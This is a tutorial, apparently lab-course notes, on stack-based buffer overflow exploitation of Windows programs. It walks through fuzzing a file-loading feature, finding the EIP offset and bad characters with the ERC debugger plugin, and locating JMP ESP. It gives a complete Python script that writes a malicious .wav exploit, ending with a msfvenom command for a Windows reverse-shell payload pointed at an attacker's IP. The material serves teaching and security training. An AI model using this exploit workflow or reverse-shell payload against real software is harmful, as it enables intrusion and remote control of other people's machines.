# Stack based buffer overflow on Windows

In Binary exploitation, our primary goal is to subvert the binary's execution in a way that benefits us.

A buffer overflow occurs when a program receives data that is longer than expected, such that it overwrites the entire buffer memory space on the stack. This can overwrite the next Instruction Pointer `EIP` (or RIP in x86_64), which causes the program to crash because it will attempt to execute instructions at an invalid memory address.

With this attack we can control the whole memory. We can place a shellcode and point the `EIP` pointer to the shellcode, so that it is executed.

With advanced protections, we will not be able to load the shellcode entirely. Instad, we would need to rely on `Return Oriented Programming (ROP)`. In this attack, we may use a combination of instructions from the binary to execute a particular function and overwrite various pointers to change the program execution flow.

## Stack overflow

The stack works in Least-In-First-Out mode: we can only remove from the stack (`pop`) the last inserted element (`push`). When we push an element to the stack, it will be in the top of the stack, when we pop, we pop from the top of the stack.

When we send a string that is longer than expected, it overwrites other existing values on the stack and would even overwrite the entire stack if it is long enough. Most importantly, we see that it overwrote the value at EIP,

This happens because of the LIFO design of the stack, which grows upwards, while a long string overflows values downwards until it eventually overwrites the return address EIP and the bottom of the stack pointer EBP.

Whenever a function is called, a new stack frame is created, and the old EIP address gets pushed to the top of the new stack frame, so the program knows where to return once the function is finished.

If we calculate our input precisely, we can place a valid address in the location where EIP is stored. This would lead the program to go to our overwritten address when it returns and subvert the program execution flow to an address of our choosing.

## Debugging Windows Programs

We need a debugger to follow the execution path and see the memory contents. An example of a good debugger is `x64dbg`. We can install [ERC.Xdbg](https://github.com/Andy53/ERC.Xdbg) plugin to help us with binary exploitation techniques.

With `x64dbg` one can run a program from it, or attach the debugger to a running program.

## Identify and fuzzing input fields

Despite Linux applications, Windows applications are visual and might provide several inputs to the user. Maybe not all of them are vulnerable to the attack. Examples of potential inputs are:

- Text input fields
- Opened files
- Program arguments
- Remote resources

We should look for a field that expects a short input, like a field that sets the date, as the date is usually short so that the developers may expect a short input only.

Another common thing we should look for is fields that are expected to be processed somehow, like the license number registration field, as it will probably be run on a specific function to test whether it is a correct license number. The same applies to opened files, as opened files tend to be processed after being opened.

For example for fuzzing text input file, we can generate a long input with:

```ps1
python -c "print('A'*10000)"
```

and pass it to the input, if the program crash, most likely it's because of buffer overflow.

If the application allows to load files, we can leverage a similar technique. One can write dummy data to a file and have it loaded in the application:

```ps1
python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
```

When we open the file in the application, the application crash, which is a good sympton to spotting the vulnerability. When we do the same but with the process attached to the debugger, we see that the message indicates that the program tried to execute the address `41414141`. In ASCII, the upper case A has hex code `0x41`, so it looks like the program tried to go to address AAAA, which means that we have successfully changed the EIP address.

We can also check the registers in the debugger and we'll see `EBP` and `EIP` registers overwritten with `41414141`.

## EIP Offset

Now we know the application is vulnerable to buffer overflow. Now we need to determine the exact offset we need to use to land in the EIP address.

In Linux, we'd use the metasploit create_pattern tool to create a pattern to observe which part gets into the EIP. In Windows, we can use the `ERC` plugin.

We can do it by executing `ERC --pattern c 5000` in xdbg console, we'll see the result in the `Log` tab.

Now we need to write the pattern into a wav file and run the program. The `EIP` register will contain some value, that we need to retrieve in ASCII and then invoke `ERC` again with the value:

```ps1
ERC --pattern o 1hF0
```

And this will return the value of the offset.

## Controlling the EIP

Now we know exactly how many bytes we need to send in the input to arrive to the EIP, the next 4 bytes will be the value we write into the EIP. We can create a small python script that generates the payload and save it as a wav file.

```python
def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)

eip_control()
```

The next step is to run the program with this input and verify that we see `42424242` in the EIP register. (`42` hex corresponds to `B`).

## Bad characters

Exactly in the sammer way of Linux, there are certain characters we shall avoid while building the shellcode. To do so, we can use `ERC` plugin:

```ps1
ERC --bytearray
```

This creates two files on our Desktop:

ByteArray_1.txt: Which contains the string of all characters we can use in our python exploit
ByteArray_1.bin: Which we can use with ERC later to compare with our input in memory.

Now, we can add the bad chars defined in the txt file into the payload script:

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()
```

and generate the payload again and run the program. First, we make sure the EIP is overriden with the expected value. We can then get the top of the stack with the `ESP` register and invoke ERC again:

`ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin`

Where `0014F974` is the value of `ESP`. The all chars data start at the top of the stack. The output compares the memory and all the chars available byte by byte. In the example, we see that after the first character, 00, all remaining bytes are different. This indicates that 0x00 truncated the remaining input, and hence it should be considered a bad character.

Now that we know the first bad character, we can repeat the process by specific the bad characters:

`ERC --bytearray -bytes 0x00`. This will generate again the two files but without the specified bad character. This should be repeated until all characters match.

## Jumping to Stack

In order to find the address whose value we want to place in EIP. We can use a legacy method called `Jumping to Stack`. We'll redirect the EIP point to the top of the stack, and we'll place the shellcode directly in the input data. This is considered a legacy method because it will not work in modern machines. In order to do so, we can:

1) Write the ESP address in the EIP.
2) Use a JMP ESP instruction.

Modern systems and programs are compiled with the NX bit on the stack or the DEP memory protection in Windows, which prevents executing any code written on the stack. So, even if we would write the shellcode on the stack, it would not be executable, nor would we find a JMP ESP instruction we can use within the program.

Writing the ESP address might not work because of the bad characters. It's more realiable to use the `JMP ESP` instruction. Any machine code in the program that contains the `JMP ESP` will be useful. We should search inside the program's `exe` file, the program's `dll` files or the OS `dll` files used by the program.

We can have such files by calling `ERC --ModuleInfo`.

Make sure the executables listed do not have any protection such as `NXCompat`, `ASLR` or `Rebase`.

Once we identified the viables files, we can go to the `Symbols` tag, double click in the file and search for the `JMP ESP` instruction. To search, just simply use `CTRL+F` and enter `jmp esp`.

As previously, we need to make sure the address does not contain any bad character.

Another example of a basic command to jump to the stack is `PUSH ESP` followed by `RET`. Since we are searching for two instructions, in this case, we should search using the machine code rather than the assembly instructions. We can use [Online Assemblers](https://defuse.ca/online-x86-assembler.htm#disassembly), or the msf-nasm_shell tool to convert any assembly instructions to machine code. Both of these take an assembly instruction and give us the corresponding machine code.

Now, we can go to the CPU tab and search patterns using `CTRL+B` and enter the assembler code into the hex field. It's important to search for entire block!

## Generating the shellcode

We can use `msfvenom` to generate the shellcode. We can list our installed payload for windows with:

```bash
msfvenom -l payloads | grep windows
```

As a proof of concept, we can try to generate a shellcode that will execute the calculator:

```bash
msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
```

Now that we have our shellcode, we can write the final payload that we'll write to the .wav file to be opened in our program. So far, we know the following:

- buffer: We can fill the buffer by writing b"A"*offset
- EIP: The following 4 bytes should be our return address
- buf: After that, we can add our shellcode.

In the previous section, we found multiple result address:

- Directly ESP address
- `JMP ESP` addresses
- `PUSH ESP; RET` addresses

To write the address in the script, we can use `pack` function and tell it to use little-endian:

```python
    eip = pack('<L', 0x00419D0B)
```

Now that we have buffer and eip, we can add our shellcode after them and generate our .wav file. However, depending on the program's current Stack Frame and Stack Alignment, by the time our JMP ESP instruction is executed, the top of the stack address ESP may have moved slightly. The first few bytes of our shellcode may get skipped, which will lead the shellcode to fail.

To prevent this, we can add a few NOP bytes before our shellcode, which has the machine code `0x90`. The stack alignment needed is usually not more than 16 bytes in most cases, and it may rarely reach 32 bytes. Since we have a lot of buffer space, we'll just add 32 bytes of NOP before our shellcode.

The final script to generate the payload is:

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    shellcode = b""
    ...SNIP...
    shellcode += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + shellcode

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
```

Now, when we run the program and load the `exploit.wav` file, the calculator will open.

To gain code execution, we just need to replace `calc.exe` by `cmd.exe`. In order to get a reverse shell, we should select another payload for the shellcode:

```bash
# List all reverse shell payloads for windows
msfvenom -l payloads | grep windows | grep reverse
# Generate the shellcode
msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'
```